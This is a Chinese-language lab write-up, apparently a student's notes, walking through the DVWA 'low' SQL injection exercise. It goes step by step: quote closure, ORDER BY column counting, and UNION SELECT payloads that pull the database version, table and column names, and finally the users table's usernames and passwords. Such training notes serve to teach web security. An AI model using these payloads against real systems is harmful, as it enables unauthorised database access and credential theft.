# SQL Injection



## low



​	输入 1 进行测试，发现可能存在sql注入漏洞。

<img src="S:\github\UniversityLogs\Dvwa\imgs\sql_low1.png" style="zoom: 33%;" />

​	逐一尝试， `1'`  发现是字符注入，并且闭合方式是单引号。

<img src="S:\github\UniversityLogs\Dvwa\imgs\sql_low2.png" style="zoom: 33%;" />

​	使用 `order by` 语句，查看字段数。（使用二分法，的方法去查询），发现只有两个字段。

<img src="S:\github\UniversityLogs\Dvwa\imgs\sql_low3.png" style="zoom: 33%;" />

​	使用联合查询判断回显位， `?id=1' and 1=2 union select 1, 2 -- ` ，发现1，2均为回显位。

> [!WARNING]
>
> 这里 `?id=1' and 1=2 union select 1, 2 -- ` 中要加 `and 1=2` 而不是 `and 1=1` 是因为数据库查询中，有可能返回查询结果中的第一行，这里使前面查询语句为永假式，使其后面联合查询语句得结果显示在第一行

<img src="S:\github\UniversityLogs\Dvwa\imgs\sql_low4.png" style="zoom:33%;" />

​	构造联合查询语句，判断数据库名称，以及坂本信息。得到数据库版本信息，以及数据库名称为 `dvwa` 

`?id=1' and 1=2 union select version(), database() -- ` 

<img src="S:\github\UniversityLogs\Dvwa\imgs\sql_low5.png" style="zoom:33%;" />

​	构造语句，查询数据库中得所有表名。

`?id=1' and 1=2 union select version(), group_concat(table_name) from information_schema.tables where table_schema=database() -- ` 得到数据库中所有得表名。

 <img src="S:\github\UniversityLogs\Dvwa\imgs\sql_low6.png" style="zoom:33%;" />

​	得到表名之后，查询中重要表中得信息，这里查询 `users` 表中得字段。

`?id=1' and 1=2 union select version(), group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' -- ` 得到 `users` 表中得字段名称

> [!WARNING]
>
> table_name='users' 中字段表名一定要加引号



<img src="S:\github\UniversityLogs\Dvwa\imgs\sql_low7.png" style="zoom:33%;" />

​	现在获取 `users` 表中user以及password信息。

`?id=1' and 1=2 union select version(), group_concat(user, password) from  users -- `

得到用户名以及密码。

<img src="S:\github\UniversityLogs\Dvwa\imgs\sql_low8.png" style="zoom: 33%;" />











































